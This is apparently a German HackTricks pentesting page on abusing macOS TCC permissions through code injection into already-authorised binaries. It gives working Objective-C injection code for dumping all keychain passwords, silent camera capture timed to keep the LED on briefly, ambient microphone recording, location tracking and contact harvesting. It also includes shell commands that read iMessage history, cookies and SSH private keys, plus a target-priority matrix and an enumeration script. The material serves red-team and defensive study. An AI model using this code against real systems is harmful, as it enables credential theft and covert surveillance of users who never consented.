# macOS-Anmeldeinformationen & Datendiebstahl über TCC-Berechtigungen

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

macOS TCC (Transparenz, Zustimmung und Kontrolle) schützt den Zugriff auf sensible Benutzerdaten. Wenn ein Angreifer **eine Binärdatei kompromittiert, die bereits TCC-Berechtigungen besitzt**, erbt er diese Berechtigungen. Diese Seite dokumentiert das Ausnutzungspotenzial jeder TCC-Berechtigung, die mit Datendiebstahl zusammenhängt.

> [!WARNING]
> Code-Injektion in eine TCC-gewährte Binärdatei (via DYLD injection, dylib hijacking, or task port) **erbt stillschweigend alle ihre TCC-Berechtigungen**. Es gibt keine zusätzliche Aufforderung oder Überprüfung, wenn derselbe Prozess geschützte Daten liest.

---

## Keychain-Zugriffsgruppen

### Die Beute

Der macOS Keychain speichert:
- **Wi-Fi-Passwörter** — alle gespeicherten Zugangsdaten zu drahtlosen Netzwerken
- **Website-Passwörter** — Safari, Chrome (wenn Keychain verwendet wird), und andere Browser-Passwörter
- **Anwendungs-Passwörter** — E-Mail-Konten, VPN-Zugangsdaten, Entwicklertokens
- **Zertifikate und private Schlüssel** — Code-Signing, Client-TLS, S/MIME-Verschlüsselung
- **Sichere Notizen** — vom Benutzer gespeicherte Geheimnisse

### Berechtigung: `keychain-access-groups`

Keychain-Einträge sind in **Zugriffsgruppen** organisiert. Die `keychain-access-groups`-Berechtigung einer Anwendung listet auf, auf welche Gruppen sie zugreifen kann:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Ausnutzung
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Kamerazugriff (kTCCServiceCamera)

### Ausnutzung

Eine binary mit Kamera-TCC-Berechtigung (über `kTCCServiceCamera` oder `com.apple.security.device.camera` entitlement) kann Fotos und Videos aufnehmen:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Stille Erfassung
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Ab **macOS Sonoma** ist der Kameraindikator in der Menüleiste persistent und kann nicht programmgesteuert ausgeblendet werden. Bei **älteren macOS-Versionen** kann eine kurze Aufnahme möglicherweise keinen auffälligen Indikator erzeugen.

---

## Mikrofonzugriff (kTCCServiceMicrophone)

### Exploitation

Mikrofonzugriff erfasst alle Audiodaten vom eingebauten Mikrofon, Headset oder angeschlossenen Audioeingabegeräten:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Angriff: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Standortverfolgung (kTCCServiceLocation)

### Exploitation
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Kontinuierliche Überwachung
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Kontakte / Kalender / Fotos

### Exfiltration personenbezogener Daten

| TCC-Dienst | Framework | Daten |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Namen, E-Mails, Telefonnummern, Adressen |
| `kTCCServiceCalendar` | `EventKit` | Meetings, Teilnehmer, Orte |
| `kTCCServicePhotos` | `Photos.framework` | Fotos, Screenshots, Standortmetadaten |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Kontakte erfassen
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud-Kontozugriff

### Berechtigung: `com.apple.private.icloud-account-access`

Diese Berechtigung erlaubt die Kommunikation mit dem XPC-Dienst `com.apple.iCloudHelper` und bietet Zugriff auf:
- **iCloud tokens** — Authentifizierungstoken für die Apple-ID des Benutzers
- **iCloud Drive** — synchronisierte Dokumente von allen Geräten
- **iCloud Keychain** — auf allen Apple-Geräten synchronisierte Passwörter
- **Find My** — Standort aller Apple-Geräte des Benutzers
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Das Kompromittieren einer iCloud-entitled Binary erweitert den Angriff von einem **einzigen Gerät auf das gesamte Apple-Ökosystem**: andere Macs, iPhones, iPads, Apple Watch. iCloud Keychain-Synchronisierung bedeutet, dass Passwörter aller Geräte zugänglich sind.

---

## Voller Festplattenzugriff (kTCCServiceSystemPolicyAllFiles)

### Die mächtigste TCC-Berechtigung

Voller Festplattenzugriff gewährt Lesezugriff auf **jede Datei im System**, einschließlich:
- Daten anderer Apps (Messages, Mail, Safari-Verlauf)
- TCC-Datenbanken (offenbaren alle anderen Berechtigungen)
- SSH-Schlüssel und Konfiguration
- Browser-Cookies und Session-Token
- Anwendungsdatenbanken und Caches
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Exploitation Priority Matrix

Beim Bewerten von injectable TCC-granted binaries nach Datenwert priorisieren:

| Priorität | TCC Permission | Warum |
|---|---|---|
| **Kritisch** | Full Disk Access | Zugriff auf alles |
| **Kritisch** | TCC Manager | Kann jede Berechtigung vergeben |
| **Hoch** | Keychain Access Groups | Alle gespeicherten Passwörter |
| **Hoch** | iCloud Account Access | Kompromittierung mehrerer Geräte |
| **Hoch** | Input Monitoring (ListenEvent) | Keylogging |
| **Hoch** | Accessibility | GUI-Steuerung, Selbstgewährung |
| **Mittel** | Screen Capture | Visuelle Datenerfassung |
| **Mittel** | Camera + Microphone | Überwachung |
| **Mittel** | Contacts + Calendar | Daten für Social Engineering |
| **Niedrig** | Location | Physische Verfolgung |
| **Niedrig** | Photos | Persönliche Daten |

## Enumeration Script
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Quellen

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
